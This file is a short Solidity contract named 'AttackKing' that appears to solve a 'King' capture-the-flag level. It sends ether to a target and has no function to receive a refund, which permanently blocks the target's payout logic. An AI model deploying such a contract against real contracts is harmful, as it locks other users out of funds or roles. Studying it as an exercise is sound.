// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './king.sol';

contract AttackKing {
    King king;

    constructor (address payable _to) public payable {
        (bool sent,) = _to.call{value: msg.value}("");
        // (bool sent,) = _to.call{value: address(this).balance}("");

        
    }
}